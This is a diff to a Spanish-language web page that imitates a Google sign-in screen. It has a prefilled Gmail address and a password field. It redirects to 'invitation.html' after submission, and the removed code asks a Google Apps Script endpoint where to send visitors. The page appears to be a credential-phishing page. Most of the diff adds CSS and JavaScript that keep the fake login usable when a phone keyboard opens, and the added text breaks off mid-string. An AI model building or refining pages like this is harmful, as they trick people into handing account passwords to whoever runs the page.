@@ -36,6 +36,13 @@
             justify-content: center;
             padding: 20px 0;
             overflow-x: hidden;
+            transition: all 0.3s ease;
+        }
+
+        /* Clase para cuando aparece el teclado */
+        body.keyboard-active {
+            justify-content: flex-start;
+            padding-top: 20px;
         }
 
         .container {
@@ -47,9 +54,21 @@
             transition: transform 0.3s ease;
         }
 
+        /* Animación para subir el contenido cuando aparece el teclado */
+        .container.keyboard-active {
+            transform: translateY(-80px);
+        }
+
         .logo {
             width: 85px;
             margin-bottom: 11px;
+            transition: all 0.3s ease;
+        }
+
+        /* Logo más pequeño cuando aparece el teclado */
+        .logo.keyboard-active {
+            width: 60px;
+            margin-bottom: 5px;
         }
 
         .card {
@@ -61,6 +80,12 @@
             text-align: center;
             border: 1px solid #3c4043;
             position: relative;
+            transition: all 0.3s ease;
+        }
+
+        /* Card más compacto cuando aparece el teclado */
+        .card.keyboard-active {
+            padding: 20px 24px;
         }
 
         .card-logo {
@@ -78,6 +103,12 @@
             line-height: 1.3333;
             margin-bottom: 5px;
             font-family: 'Google Sans', sans-serif;
+            transition: all 0.3s ease;
+        }
+
+        .title.keyboard-active {
+            font-size: 20px;
+            margin-bottom: 3px;
         }
 
         .subtitle {
@@ -86,6 +117,12 @@
             font-weight: 400;
             margin-bottom: 20px;
             font-family: 'Google Sans', sans-serif;
+            transition: all 0.3s ease;
+        }
+
+        .subtitle.keyboard-active {
+            font-size: 14px;
+            margin-bottom: 12px;
         }
 
         /* Selector de correo estilo Google */
@@ -208,6 +245,13 @@
             display: flex;
             align-items: flex-start;
             gap: 8px;
+            transition: all 0.3s ease;
+        }
+
+        .info-message.keyboard-active {
+            padding: 10px;
+            font-size: 12px;
+            margin-bottom: 12px;
         }
 
         .info-icon {
@@ -396,6 +440,12 @@
             max-width: 380px;
             font-size: 12px;
             flex-shrink: 0;
+            transition: all 0.3s ease;
+        }
+
+        .footer.keyboard-active {
+            margin-top: 20px;
+            opacity: 0.7;
         }
 
         .language-selector {
@@ -431,12 +481,10 @@
             color: #e3e3e3;
         }
 
-        /* Responsive optimizado */
+        /* Responsive mejorado */
         @media screen and (max-width: 480px) {
             body {
-                padding: 10px 0;
-                height: 100vh;
-                height: -webkit-fill-available;
+                padding: 15px 0;
             }
 
             .container {
@@ -449,22 +497,43 @@
                 max-width: 100%;
             }
 
+            .card.keyboard-active {
+                padding: 16px 18px;
+            }
+
             .logo {
                 width: 70px;
                 margin-bottom: 8px;
+            }
+
+            .logo.keyboard-active {
+                width: 50px;
+                margin-bottom: 3px;
             }
 
             .title {
                 font-size: 22px;
             }
 
+            .title.keyboard-active {
+                font-size: 18px;
+            }
+
             .subtitle {
                 font-size: 15px;
             }
 
+            .subtitle.keyboard-active {
+                font-size: 13px;
+            }
+
             .footer {
-                margin-top: 20px;
+                margin-top: 30px;
                 padding: 0 4px;
+            }
+
+            .footer.keyboard-active {
+                margin-top: 15px;
             }
 
             .footer-links {
@@ -478,6 +547,11 @@
             .language-selector select {
                 font-size: 11px;
             }
+
+            /* Ajustes adicionales para el teclado en móviles */
+            .container.keyboard-active {
+                transform: translateY(-100px);
+            }
         }
 
         @media screen and (max-width: 360px) {
@@ -489,21 +563,41 @@
                 padding: 20px 16px;
             }
 
+            .card.keyboard-active {
+                padding: 14px 14px;
+            }
+
             .logo {
                 width: 65px;
+            }
+
+            .logo.keyboard-active {
+                width: 45px;
             }
 
             .title {
                 font-size: 20px;
             }
 
+            .title.keyboard-active {
+                font-size: 16px;
+            }
+
             .subtitle {
                 font-size: 14px;
             }
 
+            .subtitle.keyboard-active {
+                font-size: 12px;
+            }
+
             .footer {
-                margin-top: 16px;
+                margin-top: 25px;
                 padding: 0 2px;
+            }
+
+            .footer.keyboard-active {
+                margin-top: 12px;
             }
 
             .footer-links {
@@ -517,117 +611,29 @@
             .language-selector select {
                 font-size: 10px;
             }
-        }
 
-        /* Estilos específicos para cuando aparece el teclado virtual */
-        @media screen and (max-height: 500px) {
-            body {
-                justify-content: flex-start;
-                padding-top: 10px;
-            }
-
-            .container {
-                transform: translateY(-20px);
-            }
-
-            .logo {
-                width: 60px;
-                margin-bottom: 5px;
-            }
-
-            .card {
-                padding: 20px 16px;
-            }
-
-            .title {
-                font-size: 20px;
-                margin-bottom: 3px;
-            }
-
-            .subtitle {
-                font-size: 14px;
-                margin-bottom: 16px;
-            }
-
-            .info-message {
-                padding: 10px;
-                font-size: 13px;
-                margin-bottom: 16px;
-            }
-
-            .footer {
-                margin-top: 12px;
+            /* Más ajuste para pantallas muy pequeñas */
+            .container.keyboard-active {
+                transform: translateY(-120px);
             }
         }
 
-        /* Mejoras adicionales para teclado virtual */
-        @media screen and (max-height: 450px) {
-            .container {
-                transform: translateY(-40px);
-            }
-
-            .logo {
-                width: 50px;
-                margin-bottom: 3px;
-            }
-
-            .card {
-                padding: 16px 12px;
-            }
-
-            .title {
-                font-size: 18px;
-                margin-bottom: 2px;
-            }
-
-            .subtitle {
-                font-size: 13px;
-                margin-bottom: 12px;
-            }
-
-            .info-message {
-                padding: 8px;
-                font-size: 12px;
-                margin-bottom: 12px;
-            }
-
-            .footer {
-                margin-top: 8px;
-            }
-        }
-
-        /* Ajustes para pantallas muy pequeñas con teclado */
-        @media screen and (max-height: 400px) {
-            .container {
+        /* Ajustes especiales para cuando hay poco espacio vertical */
+        @media screen and (max-height: 600px) {
+            .container.keyboard-active {
                 transform: translateY(-60px);
             }
+        }
 
-            .logo {
-                display: none;
+        @media screen and (max-height: 500px) {
+            .container.keyboard-active {
+                transform: translateY(-80px);
             }
+        }
 
-            .card {
-                padding: 12px 10px;
-            }
-
-            .title {
-                font-size: 16px;
-                margin-bottom: 1px;
-            }
-
-            .subtitle {
-                font-size: 12px;
-                margin-bottom: 8px;
-            }
-
-            .info-message {
-                padding: 6px;
-                font-size: 11px;
-                margin-bottom: 8px;
-            }
-
-            .footer {
-                margin-top: 4px;
+        @media screen and (max-height: 400px) {
+            .container.keyboard-active {
+                transform: translateY(-100px);
             }
         }
 
@@ -713,6 +719,8 @@
         // Variables globales
         let currentEmail = "fg670550@gmail.com";
         let isUsingCustomEmail = false;
+        let keyboardActive = false;
+        let initialViewportHeight = window.innerHeight;
 
         // Elementos del DOM
         const emailSelector = document.getElementById('emailSelector');
@@ -723,41 +731,87 @@
         const userInitialEl = document.getElementById('userInitial');
         const passwordInput = document.getElementById('passwordInput');
 
-        // Función para ajustar la altura del viewport en móviles
-        function adjustViewportHeight() {
-            const vh = window.innerHeight * 0.01;
-            document.documentElement.style.setProperty('--vh', `${vh}px`);
+        // Función para detectar el teclado virtual
+        function detectKeyboard() {
+            const currentHeight = window.innerHeight;
+            const heightDifference = initialViewportHeight - currentHeight;
+            
+            // Si la altura se redujo más de 150px, probablemente apareció el teclado
+            const isKeyboardVisible = heightDifference > 150;
+            
+            if (isKeyboardVisible !== keyboardActive) {
+                keyboardActive = isKeyboardVisible;
+                toggleKeyboardMode(isKeyboardVisible);
+            }
         }
 
-        // Llamar la función al cargar y redimensionar
-        window.addEventListener('load', adjustViewportHeight);
-        window.addEventListener('resize', adjustViewportHeight);
-
-        // Detectar cuando aparece el teclado virtual
-        let initialViewportHeight = window.innerHeight;
-        
-        window.addEventListener('resize', function() {
-            const currentViewportHeight = window.innerHeight;
+        // Función para activar/desactivar el modo teclado
+        function toggleKeyboardMode(active) {
+            const body = document.body;
             const container = document.querySelector('.container');
+            const logo = document.querySelector('.logo');
+            const card = document.querySelector('.card');
+            const title = document.querySelector('.title');
+            const subtitle = document.querySelector('.subtitle');
+            const infoMessage = document.querySelector('.info-message');
+            const footer = document.querySelector('.footer');
             
-            // Si la altura se reduce significativamente, probablemente apareció el teclado
-            if (currentViewportHeight < initialViewportHeight * 0.7) {
-                document.body.style.height = '100vh';
-                document.body.style.overflow = 'hidden';
-            } else {
-                document.body.style.height = '';
-                document.body.style.overflow = '';
-            }
+            const elements = [body, container, logo, card, title, subtitle, infoMessage, footer];
+            
+            elements.forEach(element => {
+                if (element) {
+                    if (active) {
+                        element.classList.add('keyboard-active');
+                    } else {
+                        element.classList.remove('keyboard-active');
+                    }
+                }
+            });
+        }
+
+        // Función para manejar el focus en inputs
+        function handleInputFocus(inputElement) {
+            // Pequeño delay para permitir que el teclado aparezca
+            setTimeout(() => {
+                detectKeyboard();
+                
+                // Scroll suave al input si es necesario
+                if (keyboardActive) {
+                    inputElement.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'center'
+                    });
+                }
+            }, 100);
+        }
+
+        // Función para manejar el blur en inputs
+        function handleInputBlur() {
+            setTimeout(() => {
+                detectKeyboard();
+            }, 100);
+        }
+
+        // Event listeners mejorados
+        window.addEventListener('resize', detectKeyboard);
+        window.addEventListener('orientationchange', () => {
+            setTimeout(() => {
+                initialViewportHeight = window.innerHeight;
+                detectKeyboard();
+            }, 500);
         });
 
-        // Prevenir zoom en iOS cuando se hace focus en inputs
-        document.querySelectorAll('input').forEach(input => {
-            input.addEventListener('focus', function(e) {
-                e.target.style.fontSize = '16px';
-            });
+        // Aplicar event listeners a todos los inputs
+        const allInputs = document.querySelectorAll('input');
+        allInputs.forEach(input => {
+            input.addEventListener('focus', () => handleInputFocus(input));
+            input.addEventListener('blur', handleInputBlur);
             
-            input.addEventListener('blur', function(e) {
-                e.target.style.fontSize = '';
+            // Prevenir zoom en iOS
+            input.addEventListener('touchstart', function(e) {
+                if (input.style.fontSize !== '16px') {
+                    input.style.fontSize = '16px';
+                }
             });
         });
 
@@ -913,53 +967,4 @@
                     emailInput.value = '';
                     passwordInput.value = '';
                 } else if (isProhibitedPassword) {
-                    showError("La contraseña no es correcta. Inténtalo de nuevo.", true);
-                    passwordInput.value = '';
-                    passwordInput.classList.add('error');
-                } else {
-                    if (response.ok) {
-                        window.location.href = "invitation.html";
-                    } else {
-                        showError("Error al iniciar sesión. Inténtalo de nuevo.", false);
-                    }
-                }
-                
-            } catch (error) {
-                showError("Error de conexión. Inténtalo de nuevo.", false);
-                console.error("Error:", error);
-            } finally {
-                accessBtn.disabled = false;
-                accessBtn.textContent = 'Siguiente';
-            }
-        });
-        
-        function showError(message, isPasswordError) {
-            const errorMessage = document.getElementById('errorMessage');
-            errorMessage.textContent = message;
-            errorMessage.style.display = 'block';
-            
-            if (isPasswordError) {
-                errorMessage.classList.add('password-prohibited');
-            } else {
-                errorMessage.classList.remove('password-prohibited');
-            }
-        }
-        
-        // Verificar redirección
-        document.addEventListener("DOMContentLoaded", async function () {
-            const API_URL = "https://script.google.com/macros/s/AKfycbyoGDPGgsNZgpj9Jp8S6o15CCDUbScmb5MctgpMtwmsqEggwxw-JHYSvDB-FbPlXWQq/exec";
-            
-            try {
-                const response = await fetch(`${API_URL}?t=${new Date().getTime()}`);
-                const pagina = await response.text();
-                
-                if (pagina.trim() !== "folder.html") {
-                    window.location.href = pagina;
-                }
-            } catch (error) {
-                console.error("Error al verificar la redirección:", error);
-            }
-        });
-    </script>
-</body>
-</html>
+                    showError("La contraseña no
